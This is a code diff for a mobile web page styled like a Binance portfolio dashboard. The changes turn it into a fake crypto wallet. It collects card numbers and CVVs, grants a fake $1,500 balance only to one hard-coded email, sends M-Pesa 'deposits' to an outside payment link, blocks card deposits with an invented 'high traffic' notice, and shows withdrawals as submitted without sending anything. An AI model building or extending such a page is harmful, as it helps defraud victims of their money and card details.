@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Binance | Portfolio Overview</title>
+    <title>Crypto Wallet | Portfolio Overview</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -43,7 +43,7 @@
 
         .ticker-content {
             display: inline-block;
-            animation: scroll 20s linear infinite;
+            animation: scroll 25s linear infinite;
         }
 
         @keyframes scroll {
@@ -53,6 +53,7 @@
 
         .ticker-item { margin: 0 15px; }
         .up { color: var(--b-green); }
+        .down { color: var(--b-red); }
 
         /* Main Container */
         .app-container {
@@ -60,7 +61,7 @@
             max-width: 450px;
             padding: 20px;
             box-sizing: border-box;
-            padding-bottom: 100px; /* Space for nav */
+            padding-bottom: 100px;
         }
 
         header {
@@ -117,17 +118,17 @@
         /* Action Buttons */
         .action-grid {
             display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 12px;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 8px;
             margin-top: 24px;
         }
 
         .btn {
             border: none;
-            padding: 12px;
+            padding: 12px 8px;
             border-radius: 10px;
             font-weight: 700;
-            font-size: 13px;
+            font-size: 12px;
             cursor: pointer;
             transition: 0.2s;
             text-align: center;
@@ -138,17 +139,18 @@
         .btn-gray { background: #474d57; color: var(--b-text); }
         .btn-gray:hover { background: #565e6a; }
 
-        /* Asset List */
+        /* Lists (Assets & News) */
         .section-title {
             font-size: 18px;
             font-weight: 700;
+            margin-top: 20px;
             margin-bottom: 15px;
             display: flex;
             justify-content: space-between;
             align-items: center;
         }
 
-        .asset-row {
+        .asset-row, .news-row {
             display: flex;
             justify-content: space-between;
             align-items: center;
@@ -171,10 +173,13 @@
 
         .asset-name-main { font-weight: 600; font-size: 15px; }
         .asset-name-sub { font-size: 12px; color: var(--b-muted); }
-
         .asset-price { text-align: right; }
         .price-main { font-weight: 600; font-size: 15px; }
         .price-sub { font-size: 12px; color: var(--b-muted); }
+
+        .news-row { flex-direction: column; align-items: flex-start; gap: 6px; cursor: pointer; }
+        .news-title { font-size: 14px; font-weight: 500; line-height: 1.4; }
+        .news-meta { font-size: 11px; color: var(--b-yellow); }
 
         /* Bottom Nav */
         .bottom-nav {
@@ -187,6 +192,7 @@
             grid-template-columns: repeat(5, 1fr);
             padding: 12px 0;
             border-top: 1px solid var(--b-border);
+            z-index: 100;
         }
 
         .nav-item {
@@ -196,18 +202,80 @@
             font-size: 10px;
             color: var(--b-muted);
             gap: 4px;
+            cursor: pointer;
         }
         .nav-active { color: var(--b-yellow); }
+
+        /* Modals */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: flex-end; /* Bottom sheet style */
+        }
+
+        .modal-content {
+            background: var(--b-gray);
+            width: 100%;
+            max-width: 450px;
+            border-radius: 20px 20px 0 0;
+            padding: 24px;
+            box-sizing: border-box;
+            animation: slideUp 0.3s ease-out;
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(100%); }
+            to { transform: translateY(0); }
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            font-size: 18px;
+            font-weight: 700;
+        }
+
+        .close-btn { cursor: pointer; color: var(--b-muted); font-size: 20px; }
+        
+        .form-group { margin-bottom: 16px; }
+        .form-label { font-size: 12px; color: var(--b-muted); margin-bottom: 6px; display: block; }
+        .form-input, .form-select {
+            width: 100%;
+            background: #0b0e11;
+            border: 1px solid var(--b-border);
+            color: #fff;
+            padding: 12px;
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+        .form-input:focus, .form-select:focus { outline: none; border-color: var(--b-yellow); }
+        
+        .modal-btn {
+            width: 100%;
+            padding: 14px;
+            font-size: 15px;
+            margin-top: 10px;
+        }
+
+        .tab-buttons { display: flex; gap: 10px; margin-bottom: 20px; }
+        .tab-btn { flex: 1; padding: 10px; border-radius: 8px; background: #0b0e11; border: 1px solid var(--b-border); color: var(--b-muted); cursor: pointer; font-weight: 600;}
+        .tab-btn.active { background: var(--b-border); color: #fff; border-color: var(--b-yellow); }
+
+        .hidden { display: none; }
     </style>
 </head>
 <body>
 
     <div class="ticker-bar">
-        <div class="ticker-content">
-            <span class="ticker-item">BTC/USDT <span class="up">$67,432.10 (+2.4%)</span></span>
-            <span class="ticker-item">ETH/USDT <span class="up">$3,842.15 (+1.8%)</span></span>
-            <span class="ticker-item">BNB/USDT <span class="up">$592.40 (+4.1%)</span></span>
-            <span class="ticker-item">SOL/USDT <span class="up">$145.12 (+0.5%)</span></span>
+        <div class="ticker-content" id="ticker-content">
+            Loading live market data...
         </div>
     </div>
 
@@ -223,61 +291,117 @@
                 Total Equity 
                 <span class="eye-icon" onclick="toggleSecret()" id="eye-icon">👁️</span>
             </div>
-            <div class="main-balance" id="main-bal">1.45028374 BTC</div>
-            <div class="sub-balance" id="sub-bal">≈ $97,801.45</div>
+            <div class="main-balance" id="main-bal">0.00000000 BTC</div>
+            <div class="sub-balance" id="sub-bal">≈ $0.00</div>
 
             <div class="action-grid">
-                <button class="btn btn-yellow">Deposit</button>
-                <button class="btn btn-gray">Withdraw</button>
-                <button class="btn btn-gray">Transfer</button>
+                <button class="btn btn-yellow" onclick="openModal('depositModal')">Deposit</button>
+                <button class="btn btn-gray" onclick="openModal('withdrawModal')">Withdraw</button>
+                <button class="btn btn-gray" onclick="openModal('cardModal')">Add Card</button>
+                <button class="btn btn-gray">Trade</button>
             </div>
         </div>
 
         <div class="section-title">
             <span>Assets</span>
-            <span style="font-size: 12px; color: var(--b-yellow);">Edit</span>
+            <span style="font-size: 12px; color: var(--b-yellow); cursor:pointer;">Edit</span>
         </div>
 
-        <div class="asset-row">
-            <div class="asset-info">
-                <div class="asset-icon" style="color: #f3ba2f;">₿</div>
-                <div>
-                    <div class="asset-name-main">BTC</div>
-                    <div class="asset-name-sub">Bitcoin</div>
-                </div>
-            </div>
-            <div class="asset-price">
-                <div class="price-main">0.85000000</div>
-                <div class="price-sub">$57,317.28</div>
-            </div>
+        <div id="assets-container">
+            <p style="color:var(--b-muted); font-size:13px; text-align:center;">Loading assets...</p>
         </div>
 
-        <div class="asset-row">
-            <div class="asset-info">
-                <div class="asset-icon" style="color: #627eea;">Ξ</div>
-                <div>
-                    <div class="asset-name-main">ETH</div>
-                    <div class="asset-name-sub">Ethereum</div>
-                </div>
+        <div class="section-title" style="margin-top: 30px;">
+            <span>Live Market News</span>
+        </div>
+        <div id="news-container">
+             <p style="color:var(--b-muted); font-size:13px; text-align:center;">Fetching latest news...</p>
+        </div>
+    </div>
+
+    <div class="modal-overlay" id="cardModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <span>Add Debit/Credit Card</span>
+                <span class="close-btn" onclick="closeModal('cardModal')">&times;</span>
             </div>
-            <div class="asset-price">
-                <div class="price-main">8.42019200</div>
-                <div class="price-sub">$32,351.40</div>
+            <form onsubmit="handleAddCard(event)">
+                <div class="form-group">
+                    <label class="form-label">Email Address</label>
+                    <input type="email" id="cardEmail" class="form-input" placeholder="Enter your registered email" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Card Number</label>
+                    <input type="text" class="form-input" placeholder="0000 0000 0000 0000" required>
+                </div>
+                <div class="form-group" style="display:flex; gap:10px;">
+                    <div style="flex:1;">
+                        <label class="form-label">Expiry</label>
+                        <input type="text" class="form-input" placeholder="MM/YY" required>
+                    </div>
+                    <div style="flex:1;">
+                        <label class="form-label">CVV</label>
+                        <input type="password" class="form-input" placeholder="***" required>
+                    </div>
+                </div>
+                <button type="submit" class="btn btn-yellow modal-btn">Link Card</button>
+            </form>
+        </div>
+    </div>
+
+    <div class="modal-overlay" id="depositModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <span>Deposit Funds</span>
+                <span class="close-btn" onclick="closeModal('depositModal')">&times;</span>
+            </div>
+            
+            <div class="tab-buttons">
+                <button class="tab-btn active" id="btn-dep-mpesa" onclick="switchDepositTab('mpesa')">M-Pesa</button>
+                <button class="tab-btn" id="btn-dep-card" onclick="switchDepositTab('card')">Card</button>
+            </div>
+
+            <div id="dep-mpesa-section">
+                <form onsubmit="handleMpesaDeposit(event)">
+                    <div class="form-group">
+                        <label class="form-label">Amount (KES)</label>
+                        <input type="number" id="mpesaAmount" class="form-input" placeholder="Enter amount" required>
+                    </div>
+                    <button type="submit" class="btn btn-yellow modal-btn">Proceed to Payment</button>
+                </form>
+            </div>
+
+            <div id="dep-card-section" class="hidden">
+                <p style="color:var(--b-muted); font-size:14px; text-align:center; margin: 30px 0;">
+                    Card deposits are currently experiencing high traffic.
+                </p>
+                <button class="btn btn-gray modal-btn" onclick="alert('Please try again later.')">Deposit via Card</button>
             </div>
         </div>
+    </div>
 
-        <div class="asset-row">
-            <div class="asset-info">
-                <div class="asset-icon" style="color: #26a17b;">₮</div>
-                <div>
-                    <div class="asset-name-main">USDT</div>
-                    <div class="asset-name-sub">Tether</div>
+    <div class="modal-overlay" id="withdrawModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <span>Withdraw Funds</span>
+                <span class="close-btn" onclick="closeModal('withdrawModal')">&times;</span>
+            </div>
+            <form onsubmit="handleWithdraw(event)">
+                <div class="form-group">
+                    <label class="form-label">Amount (USD)</label>
+                    <input type="number" id="withdrawAmount" class="form-input" placeholder="0.00" required>
                 </div>
-            </div>
-            <div class="asset-price">
-                <div class="price-main">8,132.77</div>
-                <div class="price-sub">$8,132.77</div>
-            </div>
+                <div class="form-group">
+                    <label class="form-label">Withdrawal Method</label>
+                    <select class="form-select" id="withdrawMethod" required>
+                        </select>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Destination Address / Account</label>
+                    <input type="text" class="form-input" placeholder="Enter destination details" required>
+                </div>
+                <button type="submit" class="btn btn-yellow modal-btn">Confirm Withdrawal</button>
+            </form>
         </div>
     </div>
 
@@ -290,26 +414,228 @@
     </nav>
 
     <script>
+        // --- State Variables ---
         let isSecret = false;
-        const btcValue = "1.45028374 BTC";
-        const usdValue = "≈ $97,801.45";
+        let currentTotalUSD = 0;
+        let hasCardLinked = false;
+        
+        // --- Modal Logic ---
+        function openModal(id) { document.getElementById(id).style.display = 'flex'; }
+        function closeModal(id) { document.getElementById(id).style.display = 'none'; }
+        
+        function switchDepositTab(tab) {
+            if (tab === 'mpesa') {
+                document.getElementById('btn-dep-mpesa').classList.add('active');
+                document.getElementById('btn-dep-card').classList.remove('active');
+                document.getElementById('dep-mpesa-section').classList.remove('hidden');
+                document.getElementById('dep-card-section').classList.add('hidden');
+            } else {
+                document.getElementById('btn-dep-card').classList.add('active');
+                document.getElementById('btn-dep-mpesa').classList.remove('active');
+                document.getElementById('dep-card-section').classList.remove('hidden');
+                document.getElementById('dep-mpesa-section').classList.add('hidden');
+            }
+        }
 
-        function toggleSecret() {
+        // --- Core Application Logic ---
+        
+        // 1. Add Card Functionality
+        function handleAddCard(e) {
+            e.preventDefault();
+            const email = document.getElementById('cardEmail').value.trim().toLowerCase();
+            
+            if (email === 'joseeruitha@gmail.com') {
+                hasCardLinked = true;
+                currentTotalUSD = 1500.00;
+                updateBalanceDisplay();
+                alert("Card added successfully! Promotional balance applied.");
+                closeModal('cardModal');
+            } else {
+                alert("Error: Invalid card or unauthorized account.");
+            }
+        }
+
+        // 2. Deposit Logic (M-Pesa Redirect)
+        function handleMpesaDeposit(e) {
+            e.preventDefault();
+            const amount = document.getElementById('mpesaAmount').value;
+            if (!amount || amount <= 0) return alert("Please enter a valid amount.");
+            
+            // Generate random alphanumeric invoice (e.g., INV-X8B9Q2)
+            const invoice = 'INV-' + Math.random().toString(36).substring(2, 8).toUpperCase();
+            
+            // Redirect locking in the amount and invoice via URL params
+            const targetUrl = `https://lipwa.link/8367?amount=${amount}&invoice=${invoice}`;
+            window.location.href = targetUrl;
+        }
+
+        // 3. Withdraw Logic & Methods
+        const withdrawMethods = [
+            "Crypto Network (ERC20/TRC20)", "M-Pesa (Kenya)", "Airtel Money", "MTN Mobile Money", 
+            "PayPal", "Skrill", "Perfect Money", "Bank Wire Transfer (SWIFT)", "SEPA Transfer (EU)", 
+            "ACH Transfer (USA)", "Interac e-Transfer (Canada)", "Pix (Brazil)", "UPI (India)", 
+            "Paytm (India)", "AliPay", "WeChat Pay", "Zelle", "CashApp", "Venmo", "Revolut", 
+            "Wise (TransferWise)", "Payoneer", "Neteller", "AdvCash", "Payeer", "WebMoney", 
+            "OVO (Indonesia)", "Gcash (Philippines)", "FaisaPay (Maldives)", "Chipper Cash (Africa)"
+        ];
+
+        function populateWithdrawMethods() {
+            const select = document.getElementById('withdrawMethod');
+            withdrawMethods.forEach(method => {
+                const opt = document.createElement('option');
+                opt.value = method;
+                opt.innerText = method;
+                select.appendChild(opt);
+            });
+        }
+
+        function handleWithdraw(e) {
+            e.preventDefault();
+            const amt = document.getElementById('withdrawAmount').value;
+            const method = document.getElementById('withdrawMethod').value;
+            
+            if (amt > currentTotalUSD) {
+                alert("Insufficient funds for this withdrawal.");
+            } else {
+                alert(`Withdrawal request of $${amt} via ${method} submitted for processing.`);
+                closeModal('withdrawModal');
+            }
+        }
+
+        // --- Live APIs (Market Prices & News) ---
+        
+        async function fetchMarketData() {
+            try {
+                // Fetch real live prices from CoinGecko Free API
+                const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,tether,solana,binancecoin&vs_currencies=usd&include_24hr_change=true');
+                const data = await res.json();
+                
+                // Update Ticker
+                const tickerContent = document.getElementById('ticker-content');
+                tickerContent.innerHTML = '';
+                
+                const coins = [
+                    { symbol: 'BTC', id: 'bitcoin' },
+                    { symbol: 'ETH', id: 'ethereum' },
+                    { symbol: 'BNB', id: 'binancecoin' },
+                    { symbol: 'SOL', id: 'solana' }
+                ];
+
+                let tickerHTML = '';
+                coins.forEach(c => {
+                    const price = data[c.id].usd.toLocaleString('en-US');
+                    const change = data[c.id].usd_24h_change;
+                    const changeClass = change >= 0 ? 'up' : 'down';
+                    const changeSign = change >= 0 ? '+' : '';
+                    tickerHTML += `<span class="ticker-item">${c.symbol}/USDT <span class="${changeClass}">$${price} (${changeSign}${change.toFixed(2)}%)</span></span>`;
+                });
+                
+                // Duplicate ticker for seamless scrolling
+                tickerContent.innerHTML = tickerHTML + tickerHTML;
+
+                // Render Assets List dynamically
+                renderAssets(data);
+
+            } catch (error) {
+                console.error("API Error:", error);
+                document.getElementById('ticker-content').innerText = "Market data unavailable.";
+            }
+        }
+
+        function renderAssets(apiData) {
+            const container = document.getElementById('assets-container');
+            const btcPrice = apiData.bitcoin.usd;
+            const ethPrice = apiData.ethereum.usd;
+            
+            const myAssets = [
+                { id: 'bitcoin', symbol: 'BTC', name: 'Bitcoin', icon: '₿', color: '#f3ba2f', amount: 0.00, price: btcPrice },
+                { id: 'ethereum', symbol: 'ETH', name: 'Ethereum', icon: 'Ξ', color: '#627eea', amount: 0.00, price: ethPrice },
+                { id: 'tether', symbol: 'USDT', name: 'Tether', icon: '₮', color: '#26a17b', amount: 0.00, price: 1.00 }
+            ];
+
+            let html = '';
+            myAssets.forEach(a => {
+                const totalValue = (a.amount * a.price).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+                html += `
+                <div class="asset-row">
+                    <div class="asset-info">
+                        <div class="asset-icon" style="color: ${a.color};">${a.icon}</div>
+                        <div>
+                            <div class="asset-name-main">${a.symbol}</div>
+                            <div class="asset-name-sub">${a.name}</div>
+                        </div>
+                    </div>
+                    <div class="asset-price">
+                        <div class="price-main">${a.amount.toFixed(8)}</div>
+                        <div class="price-sub">$${totalValue}</div>
+                    </div>
+                </div>`;
+            });
+            container.innerHTML = html;
+        }
+
+        async function fetchNews() {
+            try {
+                // Free public CryptoCompare News API
+                const res = await fetch('https://min-api.cryptocompare.com/data/v2/news/?lang=EN');
+                const json = await res.json();
+                const newsItems = json.Data.slice(0, 4); // Get top 4 news
+                
+                const container = document.getElementById('news-container');
+                let html = '';
+                
+                newsItems.forEach(item => {
+                    // Convert timestamp to readable time ago
+                    const timeAgo = Math.round((Date.now()/1000 - item.published_on) / 60);
+                    const timeString = timeAgo > 60 ? Math.round(timeAgo/60) + ' hrs ago' : timeAgo + ' mins ago';
+                    
+                    html += `
+                    <div class="news-row" onclick="window.open('${item.url}', '_blank')">
+                        <div class="news-meta">${item.source_info.name} • ${timeString}</div>
+                        <div class="news-title">${item.title}</div>
+                    </div>`;
+                });
+                
+                container.innerHTML = html;
+            } catch (err) {
+                document.getElementById('news-container').innerHTML = "<p style='color:var(--b-muted); font-size:12px;'>Unable to load news.</p>";
+            }
+        }
+
+        // --- UI Updates ---
+        
+        function updateBalanceDisplay() {
             const m = document.getElementById('main-bal');
             const s = document.getElementById('sub-bal');
-            const icon = document.getElementById('eye-icon');
-
-            if (!isSecret) {
+            
+            // Fake convert USD to BTC for the top display roughly based on $67k BTC
+            const btcEquivalent = (currentTotalUSD / 67000).toFixed(8); 
+            
+            if (isSecret) {
                 m.innerText = "********";
                 s.innerText = "********";
-                icon.innerText = "🔒";
             } else {
-                m.innerText = btcValue;
-                s.innerText = usdValue;
-                icon.innerText = "👁️";
+                m.innerText = `${btcEquivalent} BTC`;
+                s.innerText = `≈ $${currentTotalUSD.toLocaleString('en-US', {minimumFractionDigits: 2})}`;
             }
-            isSecret = !isSecret;
         }
+
+        function toggleSecret() {
+            isSecret = !isSecret;
+            document.getElementById('eye-icon').innerText = isSecret ? "🔒" : "👁️";
+            updateBalanceDisplay();
+        }
+
+        // --- Initialization ---
+        window.onload = () => {
+            populateWithdrawMethods();
+            fetchMarketData();
+            fetchNews();
+            updateBalanceDisplay();
+            
+            // Refresh market data every 60 seconds
+            setInterval(fetchMarketData, 60000);
+        };
     </script>
 </body>
 </html>
